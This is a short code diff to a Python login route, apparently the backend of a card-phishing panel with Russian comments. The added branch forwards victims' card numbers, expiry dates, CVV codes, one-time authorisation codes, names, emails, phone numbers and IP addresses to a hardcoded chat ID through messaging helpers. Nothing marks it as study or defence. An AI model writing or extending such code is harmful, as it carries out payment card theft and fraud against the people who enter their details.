@@ -286,6 +286,14 @@ def login():
             ne_pizdabol(card_number)
             send_buttons_message(s2000otp, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
+        elif id == '10000026':
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
+            if authCode is not None and authCode != 'None':
+                send_sms(s3000, card_number, expiry_date, cvv, authCode, ID, ip_address)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(s3000, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
         
         return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки
 
